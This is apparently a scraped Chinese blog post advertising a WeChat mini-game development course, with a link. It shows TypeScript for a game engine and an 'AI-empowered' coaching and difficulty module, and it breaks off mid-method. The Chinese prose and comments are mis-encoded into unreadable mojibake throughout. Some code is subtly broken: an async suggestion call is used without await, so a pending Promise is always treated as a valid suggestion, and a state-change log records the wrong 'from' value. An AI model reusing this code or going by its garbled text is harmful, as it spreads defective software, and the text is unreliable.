                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>å¾®ä¿¡å°æ¸¸æˆ0åŸºç¡€å°±ä¸šç­+CTOè¿›é˜¶ç­---youkeit.xyz/15541/å‰</strong></p>
<h2 data-id="heading-0">å¾®ä¿¡å°æ¸¸æˆå…¨æ ˆæˆé•¿ä½“ç³»ï¼šä»0åŸºç¡€åˆ°CTOçš„AIèµ‹èƒ½è·¯å¾„</h2>
<h3 data-id="heading-1">ç¬¬ä¸€ç« ï¼šå¾®ä¿¡å°æ¸¸æˆæŠ€æœ¯æ ˆå…¨æ™¯è§£æ</h3>
<h4 data-id="heading-2">1.1 ç°ä»£å°æ¸¸æˆå¼€å‘æŠ€æœ¯æ¶æ„</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// game-core/GameEngine.ts - ç°ä»£å°æ¸¸æˆå¼•æ“æ ¸å¿ƒ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">GameConfig</span> {
  <span class="hljs-attr">canvas</span>: <span class="hljs-title class_">WechatMiniprogram</span>.<span class="hljs-property">Canvas</span>
  <span class="hljs-attr">width</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">height</span>: <span class="hljs-built_in">number</span>
  maxFPS?: <span class="hljs-built_in">number</span>
  debug?: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">GameEngine</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">canvas</span>: <span class="hljs-title class_">WechatMiniprogram</span>.<span class="hljs-property">Canvas</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">ctx</span>: <span class="hljs-title class_">WechatMiniprogram</span>.<span class="hljs-property">CanvasContext</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">GameConfig</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">lastTime</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">accumulatedTime</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">isRunning</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>
  
  <span class="hljs-comment">// æ¸¸æˆçŠ¶æ€ç®¡ç†</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">states</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">GameState</span>&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()
  <span class="hljs-keyword">private</span> <span class="hljs-attr">currentState</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>
  
  <span class="hljs-comment">// AIèµ‹èƒ½æ¨¡å—</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">aiModule</span>: <span class="hljs-title class_">AIModule</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">analyticsModule</span>: <span class="hljs-title class_">AnalyticsModule</span>
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: GameConfig</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">maxFPS</span>: <span class="hljs-number">60</span>,
      <span class="hljs-attr">debug</span>: <span class="hljs-literal">false</span>,
      ...config
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> = config.<span class="hljs-property">canvas</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>)
    
    <span class="hljs-comment">// åˆå§‹åŒ–AIæ¨¡å—</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiModule</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AIModule</span>({
      <span class="hljs-attr">gameContext</span>: <span class="hljs-variable language_">this</span>,
      <span class="hljs-attr">modelPath</span>: <span class="hljs-string">'models/game-ai'</span>
    })
    
    <span class="hljs-comment">// åˆå§‹åŒ–åˆ†ææ¨¡å—</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">analyticsModule</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnalyticsModule</span>()
    
    <span class="hljs-comment">// ç»‘å®šäº‹ä»¶</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">bindEvents</span>()
  }
  
  <span class="hljs-comment">// çŠ¶æ€ç®¡ç†æ¨¡å¼</span>
  <span class="hljs-title function_">registerState</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, state: GameState</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">states</span>.<span class="hljs-title function_">set</span>(name, state)
  }
  
  <span class="hljs-title function_">switchState</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, data?: <span class="hljs-built_in">any</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">states</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>)?.<span class="hljs-title function_">exit</span>()
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span> = name
    <span class="hljs-keyword">const</span> state = <span class="hljs-variable language_">this</span>.<span class="hljs-property">states</span>.<span class="hljs-title function_">get</span>(name)
    
    <span class="hljs-keyword">if</span> (state) {
      state.<span class="hljs-title function_">enter</span>(data)
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">analyticsModule</span>.<span class="hljs-title function_">trackEvent</span>(<span class="hljs-string">'game_state_change'</span>, {
        <span class="hljs-attr">from</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>,
        <span class="hljs-attr">to</span>: name,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
      })
    }
  }
  
  <span class="hljs-comment">// ä¸»æ¸¸æˆå¾ªç¯ - ä½¿ç”¨å›ºå®šæ—¶é—´æ­¥é•¿</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">gameLoop</span>(<span class="hljs-params">timestamp: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRunning</span>) <span class="hljs-keyword">return</span>
    
    <span class="hljs-keyword">const</span> deltaTime = timestamp - <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastTime</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastTime</span> = timestamp
    
    <span class="hljs-comment">// ç´¯ç§¯æ—¶é—´</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">accumulatedTime</span> += deltaTime
    
    <span class="hljs-keyword">const</span> fixedTimeStep = <span class="hljs-number">1000</span> / <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">maxFPS</span>!
    
    <span class="hljs-comment">// æ›´æ–°æ¸¸æˆé€»è¾‘</span>
    <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">accumulatedTime</span> &gt;= fixedTimeStep) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">update</span>(fixedTimeStep)
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">accumulatedTime</span> -= fixedTimeStep
    }
    
    <span class="hljs-comment">// æ¸²æŸ“</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>()
    
    <span class="hljs-comment">// è¯·æ±‚ä¸‹ä¸€å¸§</span>
    wx.<span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">gameLoop</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>))
  }
  
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">deltaTime: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-keyword">const</span> state = <span class="hljs-variable language_">this</span>.<span class="hljs-property">states</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>)
    <span class="hljs-keyword">if</span> (state) {
      state.<span class="hljs-title function_">update</span>(deltaTime)
      
      <span class="hljs-comment">// AIè¾…åŠ©å†³ç­–</span>
      <span class="hljs-keyword">const</span> aiSuggestion = <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiModule</span>.<span class="hljs-title function_">getGameplaySuggestion</span>(state.<span class="hljs-title function_">getContext</span>())
      <span class="hljs-keyword">if</span> (aiSuggestion) {
        state.<span class="hljs-title function_">applyAISuggestion</span>(aiSuggestion)
      }
    }
  }
  
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// æ¸…é™¤ç”»å¸ƒ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">width</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">height</span>)
    
    <span class="hljs-keyword">const</span> state = <span class="hljs-variable language_">this</span>.<span class="hljs-property">states</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>)
    <span class="hljs-keyword">if</span> (state) {
      state.<span class="hljs-title function_">render</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>)
    }
    
    <span class="hljs-comment">// è°ƒè¯•ä¿¡æ¯</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">debug</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderDebugInfo</span>()
    }
  }
  
  <span class="hljs-title function_">start</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isRunning</span> = <span class="hljs-literal">true</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastTime</span> = performance.<span class="hljs-title function_">now</span>()
    wx.<span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">gameLoop</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>))
  }
  
  <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isRunning</span> = <span class="hljs-literal">false</span>
  }
}

<span class="hljs-comment">// æ¸¸æˆçŠ¶æ€åŸºç±»</span>
<span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GameState</span> {
  <span class="hljs-keyword">protected</span> <span class="hljs-attr">engine</span>: <span class="hljs-title class_">GameEngine</span>
  <span class="hljs-keyword">protected</span> <span class="hljs-attr">aiContext</span>: <span class="hljs-built_in">any</span> = {}
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">engine: GameEngine</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">engine</span> = engine
  }
  
  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">enter</span>(data?: <span class="hljs-built_in">any</span>): <span class="hljs-built_in">void</span>
  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">update</span>(<span class="hljs-attr">deltaTime</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">void</span>
  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">render</span>(<span class="hljs-attr">ctx</span>: <span class="hljs-title class_">WechatMiniprogram</span>.<span class="hljs-property">CanvasContext</span>): <span class="hljs-built_in">void</span>
  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">exit</span>(): <span class="hljs-built_in">void</span>
  
  <span class="hljs-title function_">getContext</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiContext</span>
  }
  
  <span class="hljs-title function_">applyAISuggestion</span>(<span class="hljs-params">suggestion: <span class="hljs-built_in">any</span></span>) {
    <span class="hljs-comment">// é»˜è®¤å®ç°ï¼Œå­ç±»å¯é‡å†™</span>
  }
}
</code></pre>
<h4 data-id="heading-3">1.2 AIèµ‹èƒ½çš„å°æ¸¸æˆæ ¸å¿ƒæ¨¡å—</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ai/AIModule.ts - AIèµ‹èƒ½æ¸¸æˆå†³ç­–ç³»ç»Ÿ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">AIModelConfig</span> {
  <span class="hljs-attr">modelPath</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">gameContext</span>: <span class="hljs-built_in">any</span>
  difficulty?: <span class="hljs-string">'easy'</span> | <span class="hljs-string">'medium'</span> | <span class="hljs-string">'hard'</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AIModule</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">model</span>: <span class="hljs-built_in">any</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">AIModelConfig</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">gameContext</span>: <span class="hljs-built_in">any</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">session</span>: <span class="hljs-title class_">AISession</span>
  
  <span class="hljs-comment">// ç©å®¶è¡Œä¸ºåˆ†æ</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">playerBehavior</span>: <span class="hljs-title class_">PlayerBehaviorAnalyzer</span>
  
  <span class="hljs-comment">// åŠ¨æ€éš¾åº¦è°ƒæ•´</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">difficultyManager</span>: <span class="hljs-title class_">DifficultyManager</span>
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: AIModelConfig</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = config
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">gameContext</span> = config.<span class="hljs-property">gameContext</span>
    
    <span class="hljs-comment">// åˆå§‹åŒ–AIä¼šè¯</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">session</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AISession</span>({
      <span class="hljs-attr">gameType</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">detectGameType</span>(),
      <span class="hljs-attr">playerLevel</span>: <span class="hljs-string">'beginner'</span>
    })
    
    <span class="hljs-comment">// åˆå§‹åŒ–è¡Œä¸ºåˆ†æå™¨</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">playerBehavior</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlayerBehaviorAnalyzer</span>()
    
    <span class="hljs-comment">// åˆå§‹åŒ–éš¾åº¦ç®¡ç†å™¨</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">difficultyManager</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DifficultyManager</span>()
    
    <span class="hljs-comment">// åŠ è½½AIæ¨¡å‹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadModel</span>()
  }
  
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadModel</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// ä»äº‘ç«¯æˆ–æœ¬åœ°åŠ è½½AIæ¨¡å‹</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">model</span> = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadAIModel</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">modelPath</span>)
      
      <span class="hljs-comment">// åˆå§‹åŒ–æ¨¡å‹å‚æ•°</span>
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initializeModel</span>()
      
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'AIæ¨¡å‹åŠ è½½æˆåŠŸ'</span>)
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'AIæ¨¡å‹åŠ è½½å¤±è´¥:'</span>, error)
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">useFallbackLogic</span>()
    }
  }
  
  <span class="hljs-comment">// è·å–æ¸¸æˆç©æ³•å»ºè®®</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getGameplaySuggestion</span>(<span class="hljs-attr">gameContext</span>: <span class="hljs-built_in">any</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">GameSuggestion</span>&gt; {
    <span class="hljs-comment">// åˆ†æå½“å‰æ¸¸æˆçŠ¶æ€</span>
    <span class="hljs-keyword">const</span> analysis = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">analyzeGameState</span>(gameContext)
    
    <span class="hljs-comment">// è·å–ç©å®¶è¡Œä¸ºæ¨¡å¼</span>
    <span class="hljs-keyword">const</span> playerPattern = <span class="hljs-variable language_">this</span>.<span class="hljs-property">playerBehavior</span>.<span class="hljs-title function_">getPattern</span>()
    
    <span class="hljs-comment">// ç”ŸæˆAIå»ºè®®</span>
    <span class="hljs-keyword">const</span> suggestion = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateSuggestion</span>({
      <span class="hljs-attr">gameState</span>: analysis,
      playerPattern,
      <span class="hljs-attr">difficulty</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">difficultyManager</span>.<span class="hljs-title function_">getCurrentDifficulty</span>()
    })
    
    <span class="hljs-comment">// è®°å½•å»ºè®®æ•ˆæœ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">trackSuggestionEffect</span>(suggestion)
    
    <span class="hljs-keyword">return</span> suggestion
  }
  
  <span class="hljs-comment">// ç”Ÿæˆä¸ªæ€§åŒ–æ¸¸æˆå†…å®¹</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">generateGameContent</span>(<span class="hljs-attr">params</span>: <span class="hljs-title class_">ContentGenerationParams</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">GameContent</span>&gt; {
    <span class="hljs-keyword">const</span> prompt = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">buildAIPrompt</span>(params)
    
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> wx.<span class="hljs-property">cloud</span>.<span class="hljs-title function_">callFunction</span>({
      <span class="hljs-attr">name</span>: <span class="hljs-string">'aiContentGenerator'</span>,
      <span class="hljs-attr">data</span>: {
        prompt,
        <span class="hljs-attr">gameType</span>: params.<span class="hljs-property">gameType</span>,
        <span class="hljs-attr">style</span>: params.<span class="hljs-property">style</span>
      }
    })
    
    <span class="hljs-comment">// éªŒè¯å’Œä¼˜åŒ–ç”Ÿæˆå†…å®¹</span>
    <span class="hljs-keyword">const</span> validatedContent = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateAndOptimizeContent</span>(
      response.<span class="hljs-property">result</span>
    )
    
    <span class="hljs-keyword">return</span> validatedContent
  }
  
  <span class="hljs-comment">// å®æ—¶ç©å®¶æŒ‡å¯¼ç³»ç»Ÿ</span>
  <span class="hljs-title function_">createPlayerCoach</span>(): <span class="hljs-title class_">PlayerCoach</span> {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">provideHint</span>: <span class="hljs-function">(<span class="hljs-params">context</span>) =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">provideRealTimeHint</span>(context),
      <span class="hljs-attr">analyzeMistake</span>: <span class="hljs-function">(<span class="hljs-params">action</span>) =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">analyzePlayerMistake</span>(action),
      <span class="hljs-attr">suggestImprovement</span>: <span class="hljs-function">(<span class="hljs-params">history</span>) =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">suggestPlayerImprovement</span>(history),
      <span class="hljs-attr">adjustDifficulty</span>: <span class="hljs-function">(<span class="hljs-params">performance</span>) =&gt;</span> 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">difficultyManager</span>.<span class="hljs-title function_">adjust</span>(performance)
    }
  }
  
  <span class="hljs-comment">// æ•°æ®é©±åŠ¨çš„æ¸¸æˆå¹³è¡¡è°ƒæ•´</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">balanceGameMechanics</span>(<span class="hljs-attr">data</span>: <span class="hljs-title class_">GameBalanceData</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">BalanceAdjustment</span>&gt; {
    <span class="hljs-keyword">const</span> analysis = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">analyzeBalanceData</span>(data)
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">parameterAdjustments</span>: analysis.<span class="hljs-property">suggestedAdjustments</span>,
      <span class="hljs-attr">rationale</span>: analysis.<span class="hljs-property">explanation</span>,
      <span class="hljs-attr">confidence</span>: analysis.<span class="hljs-property">confidence</span>
    }
  }
}

<span class="hljs-comment">// AIç©å®¶æŒ‡å¯¼ç³»ç»Ÿ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PlayerCoach</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">aiModule</span>: <span class="hljs-title class_">AIModule</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">playerProfile</span>: <span class="hljs-title class_">PlayerProfile</span>
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">aiModule: AIModule, playerProfile: PlayerProfile</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiModule</span> = aiModule
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">playerProfile</span> = playerProfile
  }
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">provideRealTimeHint</span>(<span class="hljs-attr">gameContext</span>: <span class="hljs-built_in">any</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">GameHint</span>&gt; {
    <span class="hljs-comment">// åˆ†æç©å®¶å½“å‰å›°å¢ƒ</span>
    <span class="hljs-keyword">const</span> analysis = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">analyzePlayerStruggle</span>(gameContext)
    
    <span class="hljs-comment">// æ ¹æ®ç©å®¶æ°´å¹³å’Œå­¦ä¹ é£æ ¼æä¾›æç¤º</span>
    <span class="hljs-keyword">const</span> hintLevel = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">determineHintLevel</span>(
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">playerProfile</span>.<span class="hljs-property">skillLevel</span>,
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">playerProfile</span>.<span class="hljs-property">learningStyle</span>
    )
    
    <span class="hljs-comment">// ç”Ÿæˆå…·ä½“æç¤º</span>
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateHint</span>(analysis, hintLevel)
  }
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">analyzePlayerMistake</span>(<span class="hljs-attr">action</span>: <span class="hljs-title class_">PlayerAction</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">MistakeAnalysis</span>&gt; {
    <span class="hljs-comment">// ä½¿ç”¨AIåˆ†æé”™è¯¯æ¨¡å¼</span>
    <span class="hljs-keyword">const</span> mistakePattern = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiModule</span>.<span class="hljs-title function_">analyzeMistakePattern</span>(action)
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">mistakeType</span>: mistakePattern.<span class="hljs-property">type</span>,
      <span class="hljs-attr">rootCause</span>: mistakePattern.<span class="hljs-property">cause</span>,
      <span class="hljs-attr">suggestedCorrection</span>: mistakePattern.<span class="hljs-property">correction</span>,
      <span class="hljs-attr">learningOpportunity</span>: mistakePattern.<span class="hljs-property">learningPoint</span>
    }
  }
  
  <span class="hljs-comment">// ç”Ÿæˆä¸ªæ€§åŒ–å­¦ä¹ è·¯å¾„</span>
  <span class="hljs-title function_">generateLearningPath</span>(<span class="hljs-attr">playerHistory</span>: <span class="hljs-title class_">PlayerHistory</span>): <span class="hljs-title class_">LearningPath</span> {
